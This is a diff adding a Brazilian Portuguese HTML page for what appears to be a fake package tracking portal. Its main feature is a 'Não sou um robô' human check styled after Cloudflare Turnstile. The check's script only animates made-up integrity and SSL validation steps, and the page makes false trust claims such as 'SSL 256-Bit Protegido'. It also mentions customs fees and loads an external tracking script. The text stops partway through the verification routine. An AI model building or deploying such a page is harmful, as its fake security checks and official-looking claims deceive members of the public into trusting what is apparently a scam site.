@@ -1,0 +1,1140 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#0a2540">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Portal de Rastreamento | Verificação de Segurança</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary: #004b87;
+            --primary-dark: #003360;
+            --primary-light: #0284c7;
+            --accent: #f59e0b;
+            --accent-hover: #d97706;
+            --success: #10b981;
+            --success-bg: #ecfdf5;
+            --bg-page: #f8fafc;
+            --surface: #ffffff;
+            --border: #e2e8f0;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --text-light: #94a3b8;
+            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --shadow-card: 0 20px 35px -10px rgba(15, 23, 42, 0.08), 0 1px 3px rgba(0, 0, 0, 0.04);
+            --shadow-hover: 0 25px 40px -10px rgba(0, 75, 135, 0.15);
+            --radius-lg: 24px;
+            --radius-md: 14px;
+            --radius-sm: 8px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: var(--bg-page);
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(2, 132, 199, 0.08) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(0, 75, 135, 0.05) 0px, transparent 50%);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            line-height: 1.5;
+        }
+
+        /* TOP NAVIGATION */
+        .top-nav {
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+            padding: 14px 24px;
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+        }
+
+        .nav-logo-icon {
+            width: 38px;
+            height: 38px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(0, 75, 135, 0.25);
+        }
+
+        .nav-logo-icon svg {
+            width: 22px;
+            height: 22px;
+            fill: currentColor;
+        }
+
+        .nav-brand-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .brand-title {
+            font-size: 1.05rem;
+            font-weight: 800;
+            color: var(--primary-dark);
+            letter-spacing: -0.02em;
+        }
+
+        .brand-subtitle {
+            font-size: 0.72rem;
+            font-weight: 600;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .nav-security-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #f1f5f9;
+            border: 1px solid var(--border);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--text-muted);
+        }
+
+        .nav-security-tag svg {
+            width: 14px;
+            height: 14px;
+            fill: var(--success);
+        }
+
+        /* MAIN CONTENT AREA */
+        main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 36px 16px;
+        }
+
+        .verify-card {
+            background: var(--surface);
+            border: 1px solid rgba(226, 232, 240, 0.8);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-card);
+            max-width: 460px;
+            width: 100%;
+            padding: 36px 28px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card-top-accent {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--accent), var(--primary-light));
+        }
+
+        /* STATUS BADGE */
+        .status-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(16, 185, 129, 0.08);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            color: #065f46;
+            font-size: 0.78rem;
+            font-weight: 700;
+            padding: 6px 14px;
+            border-radius: 999px;
+            margin-bottom: 24px;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+        }
+
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--success);
+            border-radius: 50%;
+            box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
+            animation: pulse-ring 1.8s infinite cubic-bezier(0.66, 0, 0, 1);
+        }
+
+        @keyframes pulse-ring {
+            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
+            70% { box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+
+        /* RADAR ICON CONTAINER */
+        .hero-icon-wrap {
+            position: relative;
+            width: 88px;
+            height: 88px;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .hero-icon-bg {
+            position: absolute;
+            inset: 0;
+            border-radius: 28px;
+            background: linear-gradient(135deg, rgba(0, 75, 135, 0.08), rgba(2, 132, 199, 0.12));
+            border: 1px solid rgba(2, 132, 199, 0.2);
+            transform: rotate(-6deg);
+            transition: transform 0.4s ease;
+        }
+
+        .verify-card:hover .hero-icon-bg {
+            transform: rotate(0deg);
+        }
+
+        .hero-icon {
+            position: relative;
+            width: 76px;
+            height: 76px;
+            border-radius: 24px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 24px rgba(0, 75, 135, 0.28);
+            color: #ffffff;
+        }
+
+        .hero-icon svg {
+            width: 38px;
+            height: 38px;
+            fill: currentColor;
+        }
+
+        /* TYPOGRAPHY */
+        h1 {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: var(--text-main);
+            letter-spacing: -0.02em;
+            line-height: 1.35;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 0.92rem;
+            color: var(--text-muted);
+            line-height: 1.55;
+            margin-bottom: 26px;
+            padding: 0 8px;
+        }
+
+        /* INTERACTIVE VERIFICATION WIDGET */
+        .verification-box {
+            background: #f8fafc;
+            border: 2px solid var(--border);
+            border-radius: var(--radius-md);
+            padding: 16px 18px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 14px;
+            cursor: pointer;
+            user-select: none;
+            transition: all 0.25s ease;
+            position: relative;
+        }
+
+        .verification-box:hover {
+            border-color: var(--primary-light);
+            background: #f0f7ff;
+            box-shadow: 0 4px 16px rgba(2, 132, 199, 0.08);
+        }
+
+        .verification-box.active {
+            border-color: var(--primary);
+            background: #f0f7ff;
+        }
+
+        .verification-box.success {
+            border-color: var(--success);
+            background: var(--success-bg);
+            cursor: default;
+        }
+
+        .verify-interactive-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            text-align: left;
+        }
+
+        .custom-checkbox {
+            width: 28px;
+            height: 28px;
+            border-radius: 6px;
+            border: 2px solid #cbd5e1;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: all 0.2s ease;
+        }
+
+        .verification-box:hover .custom-checkbox {
+            border-color: var(--primary-light);
+        }
+
+        .custom-checkbox .check-svg {
+            display: none;
+            width: 18px;
+            height: 18px;
+            stroke: #ffffff;
+            stroke-width: 3;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .custom-checkbox .spinner-svg {
+            display: none;
+            width: 20px;
+            height: 20px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* States */
+        .verification-box.loading .custom-checkbox {
+            border-color: var(--primary);
+            background: transparent;
+        }
+
+        .verification-box.loading .spinner-svg {
+            display: block;
+        }
+
+        .verification-box.success .custom-checkbox {
+            background: var(--success);
+            border-color: var(--success);
+            box-shadow: 0 2px 8px rgba(16, 185, 129, 0.35);
+        }
+
+        .verification-box.success .check-svg {
+            display: block;
+        }
+
+        .verify-text-wrap {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .verify-action-title {
+            font-size: 0.94rem;
+            font-weight: 700;
+            color: var(--text-main);
+            letter-spacing: -0.01em;
+            transition: color 0.2s ease;
+        }
+
+        .verify-action-desc {
+            font-size: 0.74rem;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .verify-interactive-right {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .security-badge-icon {
+            width: 34px;
+            height: 34px;
+            color: var(--primary-light);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .security-badge-icon svg {
+            width: 26px;
+            height: 26px;
+            fill: currentColor;
+        }
+
+        .security-label-nano {
+            font-size: 0.62rem;
+            font-weight: 700;
+            color: var(--text-light);
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+        }
+
+        /* PROGRESS BAR IN WIDGET */
+        .verification-progress-track {
+            position: absolute;
+            bottom: -2px;
+            left: -2px;
+            right: -2px;
+            height: 4px;
+            background: transparent;
+            border-bottom-left-radius: var(--radius-md);
+            border-bottom-right-radius: var(--radius-md);
+            overflow: hidden;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+
+        .verification-box.loading .verification-progress-track,
+        .verification-box.success .verification-progress-track {
+            opacity: 1;
+        }
+
+        .verification-progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--primary-light), var(--success));
+            transition: width 1.8s cubic-bezier(0.1, 0.8, 0.2, 1);
+        }
+
+        /* DIRECT CTA BUTTON */
+        .action-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 16px 20px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: #ffffff;
+            border: none;
+            border-radius: var(--radius-md);
+            font-size: 1rem;
+            font-weight: 700;
+            font-family: inherit;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(0, 75, 135, 0.25);
+            transition: all 0.2s ease;
+            margin-bottom: 16px;
+            letter-spacing: -0.01em;
+        }
+
+        .action-button:hover {
+            background: linear-gradient(135deg, #005a9e, #003e73);
+            box-shadow: 0 6px 20px rgba(0, 75, 135, 0.35);
+            transform: translateY(-1px);
+        }
+
+        .action-button:active {
+            transform: translateY(1px);
+        }
+
+        .action-button svg {
+            width: 18px;
+            height: 18px;
+            fill: currentColor;
+        }
+
+        /* INFO & TRUST STATS */
+        .security-hints {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 24px;
+            font-size: 0.78rem;
+            color: var(--text-muted);
+            font-weight: 500;
+            flex-wrap: wrap;
+        }
+
+        .security-hint-item {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .security-hint-item svg {
+            width: 14px;
+            height: 14px;
+            fill: var(--primary-light);
+            flex-shrink: 0;
+        }
+
+        /* CARD FOOTER LINKS */
+        .card-footer-links {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: wrap;
+            padding-top: 18px;
+            border-top: 1px solid var(--border);
+        }
+
+        .card-footer-links button {
+            background: none;
+            border: none;
+            color: var(--primary);
+            font-size: 0.8rem;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            padding: 4px 6px;
+            border-radius: 6px;
+            transition: color 0.15s, background 0.15s;
+        }
+
+        .card-footer-links button:hover {
+            color: var(--primary-dark);
+            background: rgba(0, 75, 135, 0.05);
+            text-decoration: underline;
+        }
+
+        .card-footer-links .sep {
+            color: #cbd5e1;
+            font-size: 0.75rem;
+        }
+
+        /* FAQ ACCORDION SECTION */
+        .faq-wrap {
+            max-width: 460px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 0 16px 40px;
+        }
+
+        .faq-header-title {
+            font-size: 1.05rem;
+            font-weight: 800;
+            color: var(--primary-dark);
+            text-align: center;
+            margin-bottom: 16px;
+            letter-spacing: -0.02em;
+        }
+
+        .accordion-item {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-md);
+            margin-bottom: 10px;
+            overflow: hidden;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .accordion-item:hover {
+            border-color: #cbd5e1;
+        }
+
+        .accordion-trigger {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 18px;
+            background: transparent;
+            border: none;
+            font-family: inherit;
+            font-size: 0.88rem;
+            font-weight: 700;
+            color: var(--text-main);
+            text-align: left;
+            cursor: pointer;
+            gap: 12px;
+        }
+
+        .accordion-trigger:hover {
+            background: #f8fafc;
+        }
+
+        .accordion-arrow {
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-muted);
+            transition: transform 0.25s ease;
+            flex-shrink: 0;
+        }
+
+        .accordion-arrow svg {
+            width: 16px;
+            height: 16px;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .accordion-item.active .accordion-arrow {
+            transform: rotate(180deg);
+            color: var(--primary);
+        }
+
+        .accordion-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease, padding 0.3s ease;
+            padding: 0 18px;
+        }
+
+        .accordion-item.active .accordion-content {
+            max-height: 200px;
+            padding: 0 18px 16px;
+        }
+
+        .accordion-body {
+            font-size: 0.84rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+            border-top: 1px solid #f1f5f9;
+            padding-top: 10px;
+        }
+
+        /* GLOBAL FOOTER */
+        .site-footer {
+            background: #0f172a;
+            color: #94a3b8;
+            padding: 24px 20px;
+            text-align: center;
+            font-size: 0.78rem;
+            line-height: 1.6;
+            margin-top: auto;
+            border-top: 1px solid #1e293b;
+        }
+
+        .site-footer p {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* MODALS */
+        .modal-backdrop {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 23, 42, 0.65);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            opacity: 0;
+            transition: opacity 0.25s ease;
+        }
+
+        .modal-backdrop.show {
+            display: flex;
+            opacity: 1;
+        }
+
+        .modal-box {
+            background: #ffffff;
+            border-radius: var(--radius-lg);
+            padding: 30px 24px 24px;
+            max-width: 480px;
+            width: 100%;
+            max-height: 85vh;
+            overflow-y: auto;
+            position: relative;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            transform: translateY(20px) scale(0.97);
+            transition: transform 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .modal-backdrop.show .modal-box {
+            transform: translateY(0) scale(1);
+        }
+
+        .modal-close-btn {
+            position: absolute;
+            top: 18px;
+            right: 18px;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #f1f5f9;
+            border: none;
+            font-size: 1.25rem;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .modal-close-btn:hover {
+            background: #e2e8f0;
+            color: var(--text-main);
+        }
+
+        .modal-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            color: var(--primary-dark);
+            margin-bottom: 16px;
+            padding-right: 32px;
+            letter-spacing: -0.02em;
+        }
+
+        .modal-legal-content h3 {
+            font-size: 0.95rem;
+            color: var(--primary);
+            font-weight: 700;
+            margin: 16px 0 6px;
+        }
+
+        .modal-legal-content p {
+            font-size: 0.86rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        .modal-legal-content ul {
+            font-size: 0.86rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+            padding-left: 20px;
+            margin-bottom: 12px;
+        }
+
+        .modal-action-btn {
+            display: block;
+            width: 100%;
+            margin-top: 24px;
+            padding: 12px;
+            background: #f1f5f9;
+            color: var(--text-main);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .modal-action-btn:hover {
+            background: #e2e8f0;
+        }
+
+        /* SCREEN READER ONLY */
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border-width: 0;
+        }
+
+        /* MOBILE ADJUSTMENTS */
+        @media (max-width: 480px) {
+            .verify-card {
+                padding: 28px 18px;
+            }
+            .nav-security-tag {
+                display: none;
+            }
+            h1 {
+                font-size: 1.18rem;
+            }
+            .subtitle {
+                font-size: 0.86rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- TOP HEADER -->
+    <header class="top-nav">
+        <div class="nav-brand">
+            <div class="nav-logo-icon">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2L3 6v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V6l-9-4zm0 4.18l5 2.22V12c0 3.6-2.4 6.9-5 8-2.6-1.1-5-4.4-5-8V8.4l5-2.22z"/>
+                </svg>
+            </div>
+            <div class="nav-brand-text">
+                <span class="brand-title">Verificação Segura</span>
+                <span class="brand-subtitle">Ambiente Oficial de Rastreamento</span>
+            </div>
+        </div>
+        <div class="nav-security-tag">
+            <svg viewBox="0 0 24 24">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+            </svg>
+            <span>SSL 256-Bit Protegido</span>
+        </div>
+    </header>
+
+    <!-- MAIN CARD -->
+    <main>
+        <section class="verify-card" id="cardPrincipal">
+            <div class="card-top-accent"></div>
+
+            <!-- BADGE DE STATUS -->
+            <div class="status-pill">
+                <span class="pulse-dot"></span>
+                <span>Ambiente protegido</span>
+            </div>
+
+            <!-- ÍCONE PRINCIPAL -->
+            <div class="hero-icon-wrap">
+                <div class="hero-icon-bg"></div>
+                <div class="hero-icon">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
+                    </svg>
+                </div>
+            </div>
+
+            <!-- TÍTULOS -->
+            <h1>Verificação necessária para acessar o rastreamento</h1>
+            <p class="subtitle">Para sua segurança, confirme que você é humano antes de prosseguir.</p>
+
+            <!-- COMPONENTE INTERATIVO DE VERIFICAÇÃO HUMANA (ESTILO CLOUDFLARE TURNSTILE / SMART CHECK) -->
+            <div class="verification-box" id="verificationWidget" onclick="executarVerificacao()" role="button" tabindex="0" aria-label="Confirmar que sou humano">
+                <div class="verify-interactive-left">
+                    <div class="custom-checkbox" id="checkboxIcon">
+                        <!-- Ícone de Check -->
+                        <svg class="check-svg" viewBox="0 0 24 24">
+                            <polyline points="20 6 9 17 4 12"></polyline>
+                        </svg>
+                        <!-- Spinner de Carregamento -->
+                        <svg class="spinner-svg" viewBox="0 0 24 24">
+                            <circle cx="12" cy="12" r="10" stroke="#0284c7" stroke-width="3" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round"></circle>
+                        </svg>
+                    </div>
+                    <div class="verify-text-wrap">
+                        <span class="verify-action-title" id="widgetTitle">Não sou um robô</span>
+                        <span class="verify-action-desc" id="widgetDesc">Toque para verificar sua sessão</span>
+                    </div>
+                </div>
+
+                <div class="verify-interactive-right">
+                    <div class="security-badge-icon">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                        </svg>
+                    </div>
+                    <span class="security-label-nano">Validação</span>
+                </div>
+
+                <div class="verification-progress-track">
+                    <div class="verification-progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+
+            <!-- BOTÃO DIRETO DE AÇÃO -->
+            <button class="action-button" id="ctaBtn" onclick="executarVerificacao()">
+                <svg viewBox="0 0 24 24">
+                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+                </svg>
+                <span id="btnText">Verificar e Rastrear</span>
+            </button>
+
+            <!-- HINTS DE SEGURANÇA -->
+            <div class="security-hints">
+                <div class="security-hint-item">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/>
+                    </svg>
+                    <span>Verificação rápida — sem custos</span>
+                </div>
+                <div class="security-hint-item">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                    </svg>
+                    <span>Conexão segura • Dados protegidos</span>
+                </div>
+            </div>
+
+            <!-- LINKS DO CARD -->
+            <div class="card-footer-links">
+                <button type="button" onclick="abrirModal('modalPolitica')">Política de Privacidade</button>
+                <span class="sep">•</span>
+                <button type="button" onclick="abrirModal('modalTermos')">Termos de Uso</button>
+                <span class="sep">•</span>
+                <button type="button" onclick="scrollToFAQ()">FAQ</button>
+            </div>
+        </section>
+    </main>
+
+    <!-- FAQ SECTION -->
+    <section class="faq-wrap" id="faq">
+        <h2 class="faq-header-title">Perguntas Frequentes</h2>
+
+        <div class="accordion-item">
+            <button type="button" class="accordion-trigger" onclick="toggleAccordion(this)">
+                <span>Este site cobra alguma taxa?</span>
+                <span class="accordion-arrow">
+                    <svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </span>
+            </button>
+            <div class="accordion-content">
+                <p class="accordion-body">A verificação de acesso é gratuita. Taxas aduaneiras, quando existentes, são cobradas pelos órgãos competentes diretamente.</p>
+            </div>
+        </div>
+
+        <div class="accordion-item">
+            <button type="button" class="accordion-trigger" onclick="toggleAccordion(this)">
+                <span>Por que preciso verificar que sou humano?</span>
+                <span class="accordion-arrow">
+                    <svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </span>
+            </button>
+            <div class="accordion-content">
+                <p class="accordion-body">Para proteger sua privacidade e evitar consultas automáticas indevidas ao seu código de rastreio.</p>
+            </div>
+        </div>
+
+        <div class="accordion-item">
+            <button type="button" class="accordion-trigger" onclick="toggleAccordion(this)">
+                <span>Meus dados ficam salvos?</span>
+                <span class="accordion-arrow">
+                    <svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </span>
+            </button>
+            <div class="accordion-content">
+                <p class="accordion-body">Não armazenamos dados pessoais nesta etapa. A verificação é processada localmente no seu navegador.</p>
+            </div>
+        </div>
+
+        <div class="accordion-item">
+            <button type="button" class="accordion-trigger" onclick="toggleAccordion(this)">
+                <span>Informações de contato</span>
+                <span class="accordion-arrow">
+                    <svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </span>
+            </button>
+            <div class="accordion-content">
+                <p class="accordion-body">CNPJ: 42.213.794/0001-11 — Plataforma independente de consulta de rastreamento.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer class="site-footer">
+        <p>© 2026 — Plataforma independente de rastreamento. Sem vínculo com órgãos públicos.</p>
+    </footer>
+
+    <!-- MODAL POLÍTICA DE PRIVACIDADE -->
+    <div class="modal-backdrop" id="modalPolitica" onclick="backdropClick(event, 'modalPolitica')">
+        <div class="modal-box">
+            <button type="button" class="modal-close-btn" onclick="fecharModal('modalPolitica')" aria-label="Fechar">&times;</button>
+            <h2 class="modal-title">Política de Privacidade</h2>
+            <div class="modal-legal-content">
+                <p>Tratamos dados conforme a LGPD (Lei 13.709/2018).</p>
+                <h3>1. Dados coletados</h3>
+                <p>Apenas informações técnicas necessárias para o funcionamento (cookies de sessão, logs de acesso).</p>
+                <h3>2. Finalidades</h3>
+                <ul>
+                    <li>Prestar as informações solicitadas</li>
+                    <li>Garantir segurança contra acessos automatizados</li>
+                    <li>Melhorar a experiência do usuário</li>
+                </ul>
+                <h3>3. Compartilhamento</h3>
+                <p>Não vendemos dados. Compartilhamos apenas com provedores tecnológicos essenciais, sob sigilo.</p>
+            </div>
+            <button type="button" class="modal-action-btn" onclick="fecharModal('modalPolitica')">Entendi e Fechar</button>
+        </div>
+    </div>
+
+    <!-- MODAL TERMOS DE USO -->
+    <div class="modal-backdrop" id="modalTermos" onclick="backdropClick(event, 'modalTermos')">
+        <div class="modal-box">
+            <button type="button" class="modal-close-btn" onclick="fecharModal('modalTermos')" aria-label="Fechar">&times;</button>
+            <h2 class="modal-title">Termos de Uso</h2>
+            <div class="modal-legal-content">
+                <h3>1. Aceitação</h3>
+                <p>Ao usar este site você concorda com estes termos e com nossa Política de Privacidade.</p>
+                <h3>2. Uso permitido</h3>
+                <p>Este portal é destinado à consulta informativa de rastreamento. É proibido uso automatizado ou ilícito.</p>
+                <h3>3. Isenção de responsabilidade</h3>
+                <p>Plataforma independente. Informações obtidas de bases públicas. Não representamos órgãos públicos.</p>
+            </div>
+            <button type="button" class="modal-action-btn" onclick="fecharModal('modalTermos')">Entendi e Fechar</button>
+        </div>
+    </div>
+
+    <!-- SCRIPT DE PROPAGAÇÃO DE PARÂMETROS / TRACKING -->
+    <script src="js/functions.js"></script>
+
+    <!-- CONTROLADOR DA PÁGINA -->
+    <script>
+        (function () {
+            'use strict';
+
+            var verificando = false;
+            var verificado = false;
+
+            // EXPANSÃO DO FAQ
+            window.toggleAccordion = function (btn) {
+                var item = btn.closest('.accordion-item');
+                var isActive = item.classList.contains('active');
+                
+                // Fecha outros abertos
+                document.querySelectorAll('.accordion-item').forEach(function (el) {
+                    el.classList.remove('active');
+                });
+
+                if (!isActive) {
+                    item.classList.add('active');
+                }
+            };
+
+            window.scrollToFAQ = function () {
+                var faqEl = document.getElementById('faq');
+                if (faqEl) {
+                    faqEl.scrollIntoView({ behavior: 'smooth' });
+                }
+            };
+
+            // MODAIS
+            window.abrirModal = function (id) {
+                var modal = document.getElementById(id);
+                if (modal) {
+                    modal.classList.add('show');
+                    document.body.style.overflow = 'hidden';
+                }
+            };
+
+            window.fecharModal = function (id) {
+                var modal = document.getElementById(id);
+                if (modal) {
+                    modal.classList.remove('show');
+                    document.body.style.overflow = '';
+                }
+            };
+
+            window.backdropClick = function (e, id) {
+                if (e.target.id === id) {
+                    window.fecharModal(id);
+                }
+            };
+
+            // TECLA ESC FECHA MODAIS
+            document.addEventListener('keydown', function (e) {
+                if (e.key === 'Escape') {
+                    window.fecharModal('modalPolitica');
+                    window.fecharModal('modalTermos');
+                }
+            });
+
+            // FLUXO DE VERIFICAÇÃO INTELIGENTE
+            window.executarVerificacao = function () {
+                if (verificando || verificado) return;
+                verificando = true;
+
+                var widget = document.getElementById('verificationWidget');
+                var title = document.getElementById('widgetTitle');
+                var desc = document.getElementById('widgetDesc');
+                var progress = document.getElementById('progressFill');
+                var btn = document.getElementById('ctaBtn');
+                var btnText = document.getElementById('btnText');
+
+                // Estado 1: Análise em andamento
+                widget.classList.add('loading', 'active');
+                title.textContent = "Verificando integridade...";
+                desc.textContent = "Analisando segurança do navegador...";
+                btnText.textContent = "Validando segurança...";
+                btn.style.opacity = "0.85";
+                btn.style.pointerEvents = "none";
+
+                // Inicia barra de progresso fluida
+                if (progress) {
+                    progress.style.width = "65%";
+                }
+
+                // Etapa 2: Checagem de certificado SSL
+                setTimeout(function () {
+                    title.textContent = "Validando protocolo SSL...";
+                    desc.textContent = "Criptografia de ponta a ponta confirmada";
+                    if (progress) {
